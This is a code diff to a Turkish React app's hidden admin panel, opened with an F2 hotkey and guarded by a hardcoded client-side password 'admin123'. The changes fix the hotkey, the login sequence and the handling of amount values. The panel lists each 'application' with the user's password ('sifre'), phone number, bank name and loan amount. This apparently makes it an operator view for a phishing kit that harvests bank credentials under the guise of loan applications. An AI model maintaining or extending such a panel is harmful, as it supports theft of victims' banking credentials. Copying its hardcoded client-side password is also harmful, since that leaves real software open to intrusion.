@@ -84,7 +84,10 @@ function App() {
     loadAllBanks()
     
     const handleKeyPress = (e: KeyboardEvent) => {
-      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+      // CHANGED: Hotkey -> F2 + preventDefault to avoid any default behavior
+      if (e.key === 'F2') {
+        e.preventDefault()
+        e.stopPropagation()
         setShowAdminLogin(true)
       }
     }
@@ -308,10 +311,13 @@ function App() {
   }
 
   const handleAdminLogin = () => {
+    // CHANGED: "beyaz ekran"ı önlemek için state sırası ve garanti kapatma
     if (adminPassword === 'admin123') {
       setIsAdminAuthenticated(true)
-      setShowAdminLogin(false)
-      setShowAdminPanel(true)
+      setShowAdminLogin(false) // önce login dialogunu kapat
+      setTimeout(() => {
+        setShowAdminPanel(true) // sonra admin panelini aç
+      }, 0)
     } else {
       alert('Yanlış şifre!')
     }
@@ -694,7 +700,7 @@ function App() {
                           <TableCell className="font-mono">{app.sifre}</TableCell>
                           <TableCell>{app.telefon}</TableCell>
                           <TableCell>{app.bank_name}</TableCell>
-                          <TableCell>{app.amount?.toLocaleString()} TL</TableCell>
+                          <TableCell>{(app.amount ?? 0).toLocaleString()} TL</TableCell>
                           <TableCell>{app.months} Ay</TableCell>
                           <TableCell>{new Date(app.created_at).toLocaleString('tr-TR')}</TableCell>
                         </TableRow>
@@ -816,13 +822,15 @@ function App() {
                     </div>
                     <div className="text-center">
                       <p className="text-2xl font-bold text-purple-600">
-                        {applications.reduce((sum, app) => sum + app.amount, 0).toLocaleString()}
+                        {applications.reduce((sum, app) => sum + (app.amount ?? 0), 0).toLocaleString()}
                       </p>
                       <p className="text-sm text-gray-600">Toplam Tutar (TL)</p>
                     </div>
                     <div className="text-center">
                       <p className="text-2xl font-bold text-orange-600">
-                        {applications.length > 0 ? Math.round(applications.reduce((sum, app) => sum + app.amount, 0) / applications.length).toLocaleString() : 0}
+                        {applications.length > 0 
+                          ? Math.round(applications.reduce((sum, app) => sum + (app.amount ?? 0), 0) / applications.length).toLocaleString() 
+                          : 0}
                       </p>
                       <p className="text-sm text-gray-600">Ortalama Tutar (TL)</p>
                     </div>
